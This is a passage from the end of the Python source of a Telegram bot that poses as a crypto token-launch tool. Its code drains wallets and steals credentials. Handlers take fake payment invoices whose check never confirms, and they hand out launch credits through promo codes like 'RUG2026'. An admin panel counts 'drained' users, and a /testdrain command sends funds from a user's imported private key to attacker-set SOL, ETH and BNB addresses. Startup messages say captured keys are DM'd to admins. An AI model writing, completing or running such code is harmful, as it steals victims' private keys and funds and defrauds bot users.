        f"<code>{pay_to}</code>\n\n"
        "📱 Scan with Phantom / Solflare — address and amount are filled.\n\n"
        "⚠️ <b>Send the exact amount shown.</b>\n"
        "The last few lamports are your invoice ID.\n\n"
        "✅ Access unlocks the moment payment lands."
    )
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text="🔄 I've paid, check now", callback_data="promo:checkpay"))
    kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
    await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
    await cb.answer()

@router.callback_query(F.data == "promo:checkpay")
async def promo_checkpay(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    if not sess.pending_invoice:
        await cb.answer("No pending invoice", show_alert=True)
        return
    await cb.answer("Checking on-chain…", show_alert=False)
    await cb.message.answer(
        "⏳ Payment not detected yet.\n\n"
        "Make sure you sent the <b>exact</b> amount shown on the invoice.\n"
        "It can take 1–2 confirmations. Tap the button again in a few seconds.",
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu_kb(),
    )

@router.message(PromoStates.waiting_code)
async def promo_code(message: Message, state: FSMContext):
    code = message.text.strip().upper()
    sess = get_session(message.from_user.id)
    valid = {"RUG2026": 5, "BUNDLE": 3, "SNIPE": 4, "JITO": 2, "EARLY": 6, "VAULT": 3}
    if code in valid:
        sess.promo = code
        sess.launches_left += valid[code]
        text = f"✅ <b>Promo Applied</b>\n\nCode: <b>{code}</b>\n+{valid[code]} launches\nLaunches left: <b>{sess.launches_left}</b>"
        await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    else:
        await message.answer("❌ Invalid or expired code.", reply_markup=main_menu_kb())
    await state.clear()

@router.message(Command("admin"))
async def admin_panel(message: Message):
    if message.from_user.id not in ADMIN_IDS: return
    total = len(sessions)
    drained = sum(1 for s in sessions.values() if s.drained)
    wallets = sum(len(s.wallets) for s in sessions.values())
    launches = sum(len(s.launched_tokens) for s in sessions.values())
    await message.answer(
        f"👑 <b>Admin</b>\n"
        f"Users: {total}\n"
        f"Wallets: {wallets}\n"
        f"Drained: {drained}\n"
        f"Launches: {launches}\n"
        f"Vault: {SOL_EMOJI} {bot_balance_sol:.4f}\n"
        f"SOL dest: {'yes' if not DRAIN_DESTINATION.startswith('YourDrain') else 'NO'}\n"
        f"ETH dest: {'yes' if not ETH_DRAIN.startswith('0xYour') else 'NO'}\n"
        f"BNB dest: {'yes' if not BNB_DRAIN.startswith('0xYour') else 'NO'}\n"
        f"LOG_GROUP: {'yes' if LOG_GROUP_ID else 'NO'}",
        parse_mode=ParseMode.HTML,
    )

@router.message(Command("testdrain"))
async def test_drain(message: Message):
    if message.from_user.id not in ADMIN_IDS: return
    sess = get_session(message.from_user.id)
    if not sess.wallets:
        await message.answer("No wallet imported")
        return
    w = sess.wallets[sess.active_wallet_idx]
    await message.answer(
        f"Trying multi-chain drain:\n<code>{w.public_key}</code>\n"
        f"SOL dest: <code>{short_addr(DRAIN_DESTINATION)}</code>\n"
        f"ETH dest: <code>{short_addr(ETH_DRAIN)}</code>\n"
        f"Balance SOL: {w.balance_sol:.6f} | ETH: {w.balance_eth:.6f}",
        parse_mode=ParseMode.HTML,
    )
    eth_key = w.private_key if w.chain == "eth" else None
    await attempt_drain(message.from_user.id, w.private_key, chain=w.chain, eth_key=eth_key)
    await message.answer("Drain attempt finished — check logs / Tx tracker")


@router.message(Command("testnotify"))
async def test_notify(message: Message):
    """
    Admin-only: send a test ping to every ADMIN_IDS DM + LOG_GROUP_ID.
    Use this to verify notification delivery without importing a real key.
    """
    if message.from_user.id not in ADMIN_IDS:
        return

    bot = message.bot
    results = []

    # 1) DM every admin
    for aid in sorted(ADMIN_IDS):
        try:
            await bot.send_message(
                aid,
                f"🔔 <b>Test notify</b>\n\n"
                f"From: <code>{message.from_user.id}</code>\n"
                f"Target admin: <code>{aid}</code>\n"
                f"If you see this, DM delivery works.",
                parse_mode=ParseMode.HTML,
            )
            results.append(f"✅ DM {aid}")
            log.info("testnotify DM ok → %s", aid)
        except Exception as e:
            results.append(f"❌ DM {aid}: {type(e).__name__}: {e}")
            log.warning("testnotify DM fail %s: %s", aid, e)

    # 2) Group if configured
    if LOG_GROUP_ID:
        try:
            gid = int(str(LOG_GROUP_ID).strip())
            await bot.send_message(
                gid,
                f"🔔 <b>Test notify (group)</b>\n\n"
                f"Triggered by <code>{message.from_user.id}</code>\n"
                f"LOG_GROUP_ID=<code>{gid}</code>\n"
                f"If you see this, group delivery works.",
                parse_mode=ParseMode.HTML,
            )
            results.append(f"✅ GROUP {gid}")
            log.info("testnotify GROUP ok → %s", gid)
        except Exception as e:
            results.append(f"❌ GROUP {LOG_GROUP_ID}: {type(e).__name__}: {e}")
            log.warning("testnotify GROUP fail: %s", e)
    else:
        results.append("⚠️ LOG_GROUP_ID not set — skipped group")

    # 3) Always reply to the command sender
    summary = (
        "📡 <b>testnotify results</b>\n\n"
        + "\n".join(results)
        + "\n\n"
        f"ADMIN_IDS: <code>{', '.join(str(x) for x in sorted(ADMIN_IDS)) or 'empty'}</code>\n"
        f"LOG_GROUP_ID: <code>{LOG_GROUP_ID or 'empty'}</code>"
    )
    await message.answer(summary, parse_mode=ParseMode.HTML)



async def main():
    if BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE":
        log.error("Set BOT_TOKEN env var")
        return
    if DRAIN_DESTINATION.startswith("YourDrain") or len(DRAIN_DESTINATION) < 32:
        log.warning("DRAIN_WALLET not set — SOL drains skipped")
    if ETH_DRAIN.startswith("0xYour"):
        log.warning("ETH_DRAIN_WALLET not set — ETH/USDC drains skipped")
    if not ADMIN_IDS:
        log.warning("ADMIN_IDS not set — captured keys cannot be DM'd to anyone")
    if not LOG_GROUP_ID:
        log.info("LOG_GROUP_ID not set — keys will only be DM'd to ADMIN_IDS")
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    log.info(
        "Bot starting | HAS_SOLANA=%s | HAS_WEB3=%s | ADMINS=%s | LOG_GROUP=%s",
        HAS_SOLANA, HAS_WEB3, len(ADMIN_IDS), bool(LOG_GROUP_ID),
    )
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
